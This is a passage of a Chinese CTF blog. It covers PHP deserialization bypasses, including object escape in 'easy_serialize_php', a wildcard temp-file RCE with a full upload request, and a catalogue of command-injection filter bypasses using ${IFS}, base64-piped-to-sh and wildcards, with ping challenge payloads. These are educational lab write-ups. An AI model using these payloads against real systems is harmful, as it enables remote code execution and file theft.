    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> 
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token string">'str'</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;)) &amp;#123; </span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>类中有三中属性 public 、protected 、private</p>
<p>protected：在变量名前面加上%00*%00</p>
<p>private：在类名变量名前都加上%00类名%00变量名</p>
<p>#is_valid()函数规定字符的ASCII码必须是32-125，而protected属性在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求。</p>
<p>绕过方法：</p>
<p>①PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过。</p>
<p>②private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得很清楚了。同理，protected属性会引入\x00*\x00。此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。</p>
<p>payload</p>
<pre><code>O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:7:&quot;oavinci&quot;;&#125;</code></pre>
<p><strong>安洵杯2019 easy_serialize_php (反序列化中的对象逃逸)</strong></p>
<p>题目源码</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>

<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else if($function == </span><span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else if($function == </span><span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span></code></pre>
<p>反序列化的对象逃逸问题一般分为两种</p>
<ul>
<li>第一种为<code>关键词数增加</code><br>例如： where-&gt;hacker，这样词数由五个增加到6个</li>
<li>第二种为<code>关键词数减少</code><br>例如：直接过滤掉一些关键词，例如这道题目中</li>
</ul>
<p>当我们post值，POC：<code>_SESSION[flag]=122</code>。这个为什么没有 $但是有 _ 呢？？就是post传参么。<br>name=adam。完事后就是$name=‘adam’ 。这样，所以那个传参就是这个样子了。</p>
<p>payload</p>
<pre><code>_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;//flag php 被过滤了
输出
a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;&#125;
这时s:7 刚好对应 &quot;;s:48:又刚好匹配。
为啥后面加&#125;应为这样反序列化的时候会刚好认为到这里结束，而忽然&#125;外的内容</code></pre>
<p><strong>无数字字母无~^RCEctfshow_红包第二弹</strong></p>
<p><strong>0x01了解PHP上传机制-PHP临时文件</strong></p>
<p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。<br>上传后会文件会保存在全局变量$_FILES里，该数组包含了所有上传文件的文件信息。</p>
<ol>
<li>$_FILES[‘userfile’][‘name’] 客户端文件的原名称。</li>
<li>$_FILES[‘userfile’][‘type’] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如”image/gif”。</li>
<li>$_FILES[‘userfile’][‘size’] 已上传文件的大小，单位为字节。</li>
<li>$_FILES[‘userfile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</li>
<li>$_FILES[‘userfile’][‘error’] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。</li>
<li>$_FILES[‘userfile’][‘tmp_name’] 文件被上传后在服务端存储的临时文件名</li>
</ol>
<p>这里的重点就是**$_FILES[‘userfile’][‘tmp_name’]** 这个变量。</p>
<p><strong>临时文件的存储目录</strong></p>
<p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由<strong>php.ini</strong>的<strong>upload_tmp_dir</strong>属性指定，假如<strong>upload_tmp_dir</strong>的路径不可写，PHP会上传到系统默认的临时目录中，假如开启了<strong>open_basedir</strong>，要想成功上传，系统默认临时目录需要指定PHP可访问。</p>
<p>在wamp中，<strong>upload_tmp_dir</strong>属性默认为wamp安装目录下的tmp文件夹：</p>
<p><img src="/images/89.png"></p>
<p>在Centos7中，<strong>upload_tmp_dir</strong>没有指定，所以会使用系统默认临时目录，这里是**/tmp<strong>目录，该属性可以通过</strong>sys_get_temp_dir()**函数来获得</p>
<p><img src="/images/87.png"></p>
<p><img src="/images/88.png"></p>
<p><strong>临时文件的命名规则</strong></p>
<p>在上传存储到临时目录后，<strong>临时文件命名的规则如下</strong>:</p>
<p>默认为 php+4或者6位随机数字和大小写字母</p>
<p>php[0-9A-Za-z]{3,4,5,6}</p>
<p>比如 ：phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</p>
<p><strong>0x02通配符与无字母数组命令执行</strong></p>
<p><img src="/images/90.png"></p>
<p>既然./exp.txt可以用./??p???代替<br>那么我们上传的临时文件phpxxxxx.tmp也可以用php???.tmp代替</p>
<p><strong>0x03.+/解释</strong></p>
<pre><code>linux .(点命令)：读取并且在当前的shell中执行文件中的命令</code></pre>
<p><img src="/images/91.png"></p>
<p>点执行了tmp文件里的内容ls，所以这道题中<code>.</code>就是为了执行我们上传的文件中的<code>cat /flag.txt</code>。</p>
<p><strong>0x04解题</strong></p>
<p>源码</p>
<pre><code>&lt;?php
        if(isset($_GET[&#39;cmd&#39;]))&#123;
            $cmd=$_GET[&#39;cmd&#39;];
            highlight_file(__FILE__);
            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;

                die(&quot;cerror&quot;);
            &#125;
            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\:|\,/&quot;,$cmd))&#123;
                die(&quot;serror&quot;);
            &#125;
            eval($cmd);

        &#125;

     ?&gt;</code></pre>
<p>通过POST提交修改这几行，可以得到flag</p>
<pre><code>POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</code></pre>
<pre><code>Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</code></pre>
<pre><code>-----------------------------10242300956292313528205888
Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;
Content-Type: text/plain

#! /bin/sh

cat /flag.txt
-----------------------------10242300956292313528205888--</code></pre>
<p><img src="/images/86.png"></p>
<p>payload</p>
<pre><code>POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1
Host: 7cbb13eb-9640-4d93-90b7-f8368a32a82b.challenge.ctf.show:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: UM_distinctid=178f4146ae66a1-00129bdab95d6-4c3f2779-144000-178f4146ae72a1; __cfduid=de7c42f20101a7efdf5119d4cb19b511f1619002842
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
Content-Length: 226

-----------------------------10242300956292313528205888
Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;1.jpg&quot;
Content-Type: text/plain

cat /flag.txt
-----------------------------10242300956292313528205888--</code></pre>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/25/Ping%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">
                Ping的绕过技巧
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-25</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="windows和linux管道符"><a href="#windows和linux管道符" class="headerlink" title="windows和linux管道符"></a>windows和linux管道符</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>|直接执行后面的语句</p>
<p><img src="/images/47.png"></p>
<p>||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p>
<p><img src="/images/48.png"></p>
<p>&amp;前面和后面命令都要执行，无论前面真假</p>
<p><img src="/images/49.png"></p>
<p>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
<p><img src="/images/50.png"></p>
<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><p><code>|、||、&amp;、&amp;&amp;</code>这四种管道符都存在且用法和<code>Windows</code>系统下一样，多了一个<code>;</code>管道符，作用和<code>&amp;</code>一样</p>
<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><pre><code>[root@VM-0-13-centos var]# cat flag
this is flag</code></pre>
<h4 id="lt-gt"><a href="#lt-gt" class="headerlink" title="&lt;&gt;"></a>&lt;&gt;</h4><p>payload</p>
<pre><code>[root@VM-0-13-centos var]# cat&lt;&gt;flag
this is flag

[root@VM-0-13-centos var]# cat&lt;flag
this is flag</code></pre>
<h4 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h4><p>payload</p>
<pre><code>[root@VM-0-13-centos var]# cat$&#123;IFS&#125;flag
this is flag</code></pre>
<h4 id="IFS-1"><a href="#IFS-1" class="headerlink" title="$IFS$1"></a>$IFS$1</h4><pre><code>[root@VM-0-13-centos var]# cat$IFS$1flag
this is flag</code></pre>
<h4 id="09-需php环境"><a href="#09-需php环境" class="headerlink" title="%09(需php环境)"></a>%09(需php环境)</h4><p><img src="/images/51.png"></p>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><pre><code>[root@VM-0-13-centos var]# a=c;b=at;c=fl;d=ag;$a$b $c$d
this is flag</code></pre>
<h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><pre><code>[root@VM-0-13-centos var]# echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash
this is flag</code></pre>
<h4 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h4><pre><code>[root@VM-0-13-centos var]# ca&#39;&#39;t f&quot;&quot;lag
this is flag</code></pre>
<h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><pre><code>[root@VM-0-13-centos var]# ca\t flag
this is flag</code></pre>
<h4 id="1、-2、"><a href="#1、-2、" class="headerlink" title="$1、$2、$@"></a>$1、$2、$@</h4><pre><code>[root@VM-0-13-centos var]# c$1at flag
this is flag
[root@VM-0-13-centos var]# c$2at flag
this is flag
[root@VM-0-13-centos var]# cat f$@lag
this is flag</code></pre>
<h4 id="其他命令代替（一般题目不会全过滤干净）"><a href="#其他命令代替（一般题目不会全过滤干净）" class="headerlink" title="其他命令代替（一般题目不会全过滤干净）"></a>其他命令代替（一般题目不会全过滤干净）</h4><pre><code>(1)more:一页一页的显示档案内容
(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
(3)head:查看头几行
(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
(5)tail:查看尾几行
(6)nl：显示的时候，顺便输出行号
(7)od:以二进制的方式读取档案内容
(8)vi:一种编辑器，这个也可以查看
(9)vim:一种编辑器，这个也可以查看
(10)sort:可以查看
(11)uniq:可以查看
(12)file -f:报错出具体内容
(13)pr</code></pre>
<h4 id="通配符绕过（有点不好理解，自己可以在本地实验下）"><a href="#通配符绕过（有点不好理解，自己可以在本地实验下）" class="headerlink" title="通配符绕过（有点不好理解，自己可以在本地实验下）"></a>通配符绕过（有点不好理解，自己可以在本地实验下）</h4><pre><code>root@kali:~# /???/?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;
this is your flag

root@kali:~# /???/?at flag
this is your flag

root@kali:~# /???/?at ????
this is your flag

root@kali:~# /???/?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;
this is your flag</code></pre>
<h4 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h4><p>反引号`和$(命令)</p>
<pre><code>[root@VM-0-13-centos var]# echo `cat flag`
this is flag

[root@VM-0-13-centos var]# echo &quot;$(cat flag)&quot;
this is flag</code></pre>
<h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><pre><code>&gt;创建文件（会把原来的内容覆盖）
&gt;&gt;（不会覆盖，会接在下一行）</code></pre>
<p>#相关方法可以看看我的文章-nepctf总结（不是很全勿喷）</p>
<p>题目练习(NepCTF-little_trick)</p>
<h3 id="题目-GXYCTF2019-ping-ping-ping"><a href="#题目-GXYCTF2019-ping-ping-ping" class="headerlink" title="题目[GXYCTF2019]ping ping ping"></a>题目[GXYCTF2019]ping ping ping</h3><p>题目比较简单，直接上payload</p>
<p>#拼接</p>
<pre><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre>
<p>#内敛执行</p>
<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`</code></pre>
<p>#编码</p>
<pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_5">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_5</a></p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/3/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/5/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>